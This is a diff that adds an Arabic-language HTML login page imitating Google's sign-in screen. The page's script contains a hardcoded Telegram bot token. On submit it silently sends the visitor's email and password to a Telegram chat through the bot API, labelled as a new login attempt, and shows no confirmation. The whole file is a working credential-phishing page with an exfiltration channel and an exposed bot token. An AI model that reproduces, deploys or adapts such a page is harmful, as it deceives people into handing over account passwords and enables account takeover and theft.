@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    background: #fff;
+    font-family: Arial, Tahoma, sans-serif;
+    color: #444;
+}
+
+.page {
+    width: 100%;
+    min-height: 100vh;
+    text-align: center;
+    padding-top: 55px;
+}
+
+.google-logo {
+    font-family: 'Product Sans', Arial, sans-serif;
+    font-size: 58px;
+    font-weight: 500;
+    letter-spacing: -2px;
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+    direction: ltr;
+}
+.google-logo span { display: inline-block; }
+.google-logo .g1 { color: #4285F4; }
+.google-logo .o1 { color: #EA4335; }
+.google-logo .o2 { color: #FBBC05; }
+.google-logo .g2 { color: #4285F4; }
+.google-logo .l  { color: #34A853; }
+.google-logo .e  { color: #EA4335; }
+
+.title {
+    font-size: 30px;
+    font-weight: 400;
+    margin: 5px 0 12px;
+    color: #333;
+}
+
+.subtitle {
+    font-size: 17px;
+    margin-bottom: 28px;
+    color: #666;
+}
+
+.login-box {
+    width: 430px;
+    max-width: calc(100% - 30px);
+    margin: auto;
+    border: 1px solid #ddd;
+    padding: 38px 42px 32px;
+    box-shadow: 0 1px 5px rgba(0,0,0,.15);
+    background: white;
+}
+
+.avatar {
+    width: 105px;
+    height: 105px;
+    margin: 0 auto 30px;
+    border-radius: 50%;
+    background: #eee;
+    position: relative;
+}
+.avatar::before {
+    content: "";
+    position: absolute;
+    width: 35px;
+    height: 35px;
+    border-radius: 50%;
+    background: #bbb;
+    top: 20px;
+    left: 35px;
+}
+.avatar::after {
+    content: "";
+    position: absolute;
+    width: 70px;
+    height: 38px;
+    border-radius: 50% 50% 45% 45%;
+    background: #bbb;
+    bottom: 15px;
+    left: 17px;
+}
+
+.input {
+    width: 100%;
+    height: 58px;
+    border: 1px solid #c9c9c9;
+    outline: none;
+    font-size: 16px;
+    padding: 0 15px;
+    margin-bottom: 12px;
+    text-align: right;
+    direction: rtl;
+}
+.input:focus {
+    border-color: #4285f4;
+    box-shadow: inset 0 0 0 1px #4285f4;
+}
+
+.login-button {
+    width: 100%;
+    height: 56px;
+    border: none;
+    background: #4285f4;
+    color: white;
+    font-size: 17px;
+    cursor: pointer;
+    margin-top: 4px;
+    transition: background 0.2s;
+}
+.login-button:hover { background: #357ae8; }
+.login-button:disabled {
+    background: #a0bff0;
+    cursor: not-allowed;
+}
+
+.options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 15px;
+    font-size: 14px;
+}
+.options label { cursor: pointer; }
+.help {
+    color: #4285f4;
+    text-decoration: none;
+}
+.help:hover { text-decoration: underline; }
+
+.create {
+    display: inline-block;
+    margin-top: 38px;
+    color: #4285f4;
+    text-decoration: none;
+    font-size: 16px;
+}
+.create:hover { text-decoration: underline; }
+
+.message {
+    display: none;
+    margin-top: 15px;
+    font-size: 14px;
+    padding: 8px 12px;
+    border-radius: 4px;
+}
+.message.error {
+    display: block;
+    color: #d93025;
+    background: #fce8e6;
+}
+.message.info {
+    display: block;
+    color: #1a73e8;
+    background: #e8f0fe;
+}
+/* تم حذف كلاس success لأننا لن نستخدمه */
+
+@media (max-width: 500px) {
+    .page { padding-top: 35px; }
+    .google-logo { font-size: 42px; }
+    .title { font-size: 25px; }
+    .subtitle { font-size: 15px; }
+    .login-box {
+        border: none;
+        box-shadow: none;
+        width: 100%;
+        padding: 30px 25px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="page">
+
+    <div class="google-logo">
+        <span class="g1">G</span><span class="o1">o</span>
+        <span class="o2">o</span><span class="g2">g</span>
+        <span class="l">l</span><span class="e">e</span>
+    </div>
+
+    <h1 class="title">حساب واحد لجميع خدماتك</h1>
+    <div class="subtitle">سجّل دخولك باستخدام حسابك</div>
+
+    <div class="login-box">
+
+        <div class="avatar"></div>
+
+        <input type="email" id="email" class="input" placeholder="البريد الإلكتروني">
+        <input type="password" id="password" class="input" placeholder="كلمة المرور">
+
+        <button class="login-button" id="loginBtn" onclick="login()">تسجيل الدخول</button>
+
+        <div class="options">
+            <label><input type="checkbox" id="remember"> حفظ تسجيل الدخول</label>
+            <a href="#" class="help" onclick="forgotPassword()">بحاجة إلى مساعدة؟</a>
+        </div>
+
+        <div class="message" id="message"></div>
+
+    </div>
+
+    <a href="#" class="create" onclick="createAccount()">إنشاء حساب</a>
+</div>
+
+<script>
+// ======================================================
+// 🔐 التوكن الخاص بك
+// ======================================================
+const TELEGRAM_TOKEN = "7216667772:AAHsAxTPv_8Lzns19UkYOtnO7KSaBemNlik";
+
+let currentChatId = null;
+
+// ======================================================
+// جلب Chat ID تلقائياً (بدون رسائل نجاح، فقط رسائل خطأ/إعلام)
+// ======================================================
+async function fetchChatIdAutomatically() {
+    const messageDiv = document.getElementById("message");
+    
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`;
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.ok && data.result && data.result.length > 0) {
+            const lastUpdate = data.result[data.result.length - 1];
+            if (lastUpdate.message && lastUpdate.message.chat && lastUpdate.message.chat.id) {
+                currentChatId = lastUpdate.message.chat.id;
+                console.log("✅ Chat ID جاهز (مخفي)");
+                // لا نعرض أي رسالة نجاح، فقط ننظف أي رسائل سابقة
+                messageDiv.style.display = "none";
+                return;
+            }
+        }
+
+        // إذا لم يجد معرفاً، يعرض رسالة إعلامية (ليست نجاحاً)
+        showMessage(
+            "⚠️ يرجى فتح تيليجرام، وإرسال أي رسالة للبوت، ثم تحديث الصفحة.",
+            "info"
+        );
+
+    } catch (error) {
+        console.error(error);
+        showMessage("⚠️ حدث خطأ في الاتصال بالبوت، تأكد من اتصالك بالإنترنت.", "error");
+    }
+}
+
+// ======================================================
+// 🚀 دالة تسجيل الدخول – بدون رسائل نجاح
+// ======================================================
+async function login() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const loginBtn = document.getElementById("loginBtn");
+    const messageDiv = document.getElementById("message");
+
+    // 1. التحقق من الحقول
+    if (!email || !password) {
+        showMessage("يرجى إدخال البريد الإلكتروني وكلمة المرور.", "error");
+        return;
+    }
+
+    // 2. التأكد من وجود Chat ID
+    if (!currentChatId) {
+        showMessage("⚠️ لم يتم الربط مع البوت بعد. يرجى إرسال رسالة للبوت في تيليجرام ثم تحديث الصفحة.", "error");
+        return;
+    }
+
+    // 3. تعطيل الزر وإخفاء أي رسائل سابقة
+    loginBtn.disabled = true;
+    loginBtn.textContent = "جاري الإرسال...";
+    messageDiv.style.display = "none";
+
+    try {
+        // 4. إرسال البيانات إلى تيليجرام
+        const text = `🚨 محاولة تسجيل دخول جديدة!%0A📧 البريد: ${encodeURIComponent(email)}%0A🔑 كلمة المرور: ${encodeURIComponent(password)}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${currentChatId}&text=${text}`;
+
+        const response = await fetch(url);
+
+        if (response.ok) {
+            // ✅ تم الإرسال بنجاح – لا نعرض أي رسالة، فقط نعيد التوجيه (اختياري)
+            // window.location.href = "/dashboard";  // فك التعليق لتفعيل التوجيه
+            // أو نعيد تعيين الزر فقط بدون رسالة
+        } else {
+            // في حال فشل الإرسال (نعرض رسالة خطأ عامة)
+            showMessage("❌ فشل الإرسال، تأكد من أن البوت نشط وحاول مجدداً.", "error");
+        }
+    } catch (error) {
+        console.error(error);
+        showMessage("❌ حدث خطأ في الاتصال بالإنترنت.", "error");
+    } finally {
+        // إعادة تمكين الزر
+        loginBtn.disabled = false;
+        loginBtn.textContent = "تسجيل الدخول";
+    }
+}
+
+// ======================================================
+// دوال مساعدة للرسائل (للخطأ فقط)
+// ======================================================
+function showMessage(text, type) {
+    const msg = document.getElementById("message");
+    msg.textContent = text;
+    msg.className = "message";
+    if (text && type) {
+        msg.classList.add(type);
+        msg.style.display = "block";
+    } else {
+        msg.style.display = "none";
+    }
+}
+
+function forgotPassword() {
+    alert("سيتم فتح صفحة استعادة كلمة المرور.");
+}
+
+function createAccount() {
+    alert("سيتم فتح صفحة إنشاء حساب جديد.");
+}
+
+// ======================================================
+// تشغيل الجلب التلقائي عند تحميل الصفحة
+// ======================================================
+window.onload = function() {
+    fetchChatIdAutomatically();
+};
+</script>
+
+</body>
+</html>
